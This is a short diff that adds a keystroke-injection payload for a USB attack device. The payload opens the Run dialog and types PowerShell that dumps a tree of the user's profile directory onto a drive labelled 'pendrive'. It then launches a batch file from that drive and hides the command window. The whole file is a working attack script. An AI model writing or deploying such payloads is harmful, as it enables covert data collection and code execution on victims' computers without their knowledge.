@@ -1,0 +1,10 @@
+powershell tree c:/users/$env:username > ((get-volume -filesystemlabel pendrive).driveletter+':\test.txt')
+REM Payload that generates a tree log into Visble MSD partition.
+WAITFOR_INIT
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell tree c:/users/$env:username > ((get-volume -filesystemlabel pendrive).driveletter+':\secured'); start-process ((get-volume -filesystemlabel pendrive).driveletter+':\working.bat')
+DELAY 200
+REM Hide cmd process
+GUI DOWN
